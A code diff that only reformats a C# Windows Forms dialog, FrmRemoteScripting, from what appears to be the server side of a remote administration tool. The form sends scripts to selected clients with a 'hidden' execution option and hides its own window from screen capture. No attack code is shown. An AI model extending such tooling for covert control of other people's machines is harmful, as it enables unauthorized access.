@@ -11,17 +11,17 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Xml.Linq;
 
 namespace Pulsar.Server.Forms
 {
     public partial class FrmRemoteScripting : Form
-    { 
+    {
         private readonly int _selectedClients;
 
-    public string Lang { get; set; }
-    public string Script { get; set; }
+        public string Lang { get; set; }
+        public string Script { get; set; }
         public bool Hidden { get; set; }
+
         public FrmRemoteScripting(int selected)
         {
             _selectedClients = selected;
@@ -29,7 +29,7 @@ namespace Pulsar.Server.Forms
             InitializeComponent();
 
             DarkModeManager.ApplyDarkMode(this);
-			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
         }
 
         private void ExecBtn_Click(object sender, EventArgs e)
@@ -58,7 +58,6 @@ namespace Pulsar.Server.Forms
                 Script = JSEdit.Text;
                 Hidden = HidCheckBox.Checked;
             }
-
 
             this.DialogResult = DialogResult.OK;
             this.Close();
